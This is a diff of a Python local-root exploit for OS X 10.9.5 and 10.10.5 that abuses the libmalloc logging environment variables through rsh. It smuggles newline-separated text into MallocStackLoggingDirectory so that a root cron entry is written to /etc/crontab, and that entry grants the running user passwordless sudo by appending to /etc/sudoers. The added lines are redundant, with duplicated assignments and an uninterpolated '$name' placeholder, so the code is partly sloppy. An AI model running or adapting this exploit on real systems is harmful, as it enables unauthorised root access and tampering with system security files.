@@ -2,10 +2,10 @@
 # rsh + libmalloc osx local root
 # tested on osx 10.9.5 / 10.10.5
 # jul/2015
-
 import os,time,sys,subprocess
 whoami = subprocess.check_output(['whoami'])
 env = {}
+
 def rsh():
 	s = os.stat("/etc/sudoers").st_size
 
@@ -14,6 +14,16 @@ def rsh():
 	env['MallocStackLoggingDirectory'] = 'a\n* * * * * root echo " %s ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\n\n\n\n\n' % whoami
 
 	sys.stderr.write("creating /etc/crontab..")
+
+	proc = subprocess.Popen('whoami', stdout=subprocess.PIPE)
+	name = proc.stdout.read()
+	s = os.stat("/etc/sudoers").st_size
+
+	env['MallocLogFile'] = '/etc/crontab'
+	env['MallocStackLogging'] = 'yes'
+	env['MallocStackLoggingDirectory'] = 'a\n* * * * * root echo " $name ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\n\n\n\n\n'
+	env['MallocStackLoggingDirectory'] = 'a\n* * * * * root echo " %s ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\n\n\n\n\n' % whoami
+
 
 	p = os.fork()
 	if p == 0:
